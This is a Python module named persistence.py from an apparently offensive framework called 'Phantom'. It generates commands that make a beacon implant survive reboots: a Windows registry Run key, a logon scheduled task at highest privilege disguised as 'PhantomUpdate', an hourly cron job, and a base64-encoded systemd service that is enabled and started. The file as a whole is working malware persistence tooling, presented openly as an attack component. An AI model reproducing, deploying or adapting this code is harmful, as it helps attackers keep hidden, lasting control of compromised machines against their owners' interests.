"""
persistence.py — Phantom Persistence Module
─────────────────────────────────────────────
Generates and executes persistence commands for various platforms.
"""

import os
import base64
from phantom.utils.notifier import notifier

class PersistenceManager:
    @staticmethod
    def get_windows_runkey(binary_path: str, name: str = "PhantomBeacon") -> str:
        """Generate a Windows Registry Run Key command."""
        cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {name} /t REG_SZ /d "{binary_path}" /f'
        return cmd

    @staticmethod
    def get_windows_schtask(binary_path: str, name: str = "PhantomUpdate") -> str:
        """Generate a Windows Scheduled Task command (runs on logon)."""
        cmd = f'schtasks /create /tn "{name}" /tr "{binary_path}" /sc onlogon /rl highest /f'
        return cmd

    @staticmethod
    def get_linux_cron(binary_path: str) -> str:
        """Generate a Linux Crontab entry (runs every hour)."""
        return f'(crontab -l 2>/dev/null; echo "0 * * * * {binary_path}") | crontab -'

    @staticmethod
    def get_linux_systemd(binary_path: str, name: str = "phantom") -> str:
        """Generate a Linux Systemd service unit (requires root)."""
        unit = f"""[Unit]
Description=Phantom Beacon
After=network.target

[Service]
ExecStart={binary_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        # Command to create and start the service
        b64_unit = base64.b64encode(unit.encode()).decode()
        cmd = f"echo {b64_unit} | base64 -d > /etc/systemd/system/{name}.service && systemctl enable {name} && systemctl start {name}"
        return cmd

persistence_manager = PersistenceManager()
